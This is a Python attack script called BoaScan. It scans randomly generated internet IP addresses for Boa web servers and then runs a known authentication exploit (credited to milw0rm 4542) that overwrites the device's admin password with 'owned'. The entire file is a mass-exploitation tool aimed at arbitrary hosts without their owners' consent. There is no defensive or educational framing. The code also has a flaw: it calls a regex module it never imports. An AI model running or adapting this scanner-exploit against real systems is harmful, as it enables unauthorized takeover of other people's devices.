#!/usr/bin/python
#Scans for Boa webserver, then exploits

#Exploit: http://www.milw0rm.com/exploits/4542

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import socket, httplib, threading, time, sys, random, urllib2

def scan(ip, msg):
	ports = [80,8000,8080]
	print "Testing:",ip
	for port in ports:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip, port))
			s.close()
			print "\n[+] Open:",ip+":"+str(port)
			servtest(ip, port)
		except:
			pass

def servtest(ip, port):
	
	try:
		h = httplib.HTTP(ip+":"+str(port))
		h.putrequest("HEAD", "/")
		h.putheader("Host", ip)
		h.endheaders()
		status, reason, headers = h.getreply()
		server = headers.get("Server")
		if server:
			print "[+] Running:",server,"\n"
			if re.search("boa", server.lower()):
				print "\t[!] Boa Server Found"
				exploit(ip)
	except: 
		pass

def randip():
	
	A = random.randrange(255) + 1
	B = random.randrange(255) + 1
	C = random.randrange(255) + 1
	D = random.randrange(255) + 1
	ip = "%d.%d.%d.%d" % (A,B,C,D)
	return ip

def exploit(ip):
	print "\t[+] Exploiting:",ip
	USERNAME = 'a'*127
	NEW_PASSWORD = 'owned'
	try:
		auth_handler = urllib2.HTTPBasicAuthHandler()
		auth_handler.add_password('LOGIN(default username & password is admin)', ip, USERNAME, NEW_PASSWORD);
		opener = urllib2.build_opener(auth_handler)
		urllib2.install_opener(opener)
		res = urllib2.urlopen('http://'+ip+'/home/index.shtml')
		print "\t[-] Exploit Successful"
	except:
		print "\t[-] Exploit Failed"

print "\n\t   d3hydr8[at]gmail[dot]com BoaScan v1.0"
print "\t----------------------------------------------\n"
if len(sys.argv) < 2:
	print "Usage: ./boascan.py <how many?>\n"
	sys.exit(1)
	
print "[+] Scanning:",sys.argv[1],"ips\n"

socket.setdefaulttimeout(3)

for x in xrange(int(sys.argv[1])):
	time.sleep(1)
	threading.Thread( target=scan, args=(randip(), 0) ).start()
time.sleep(5)
print "\n[-] Done\n"

	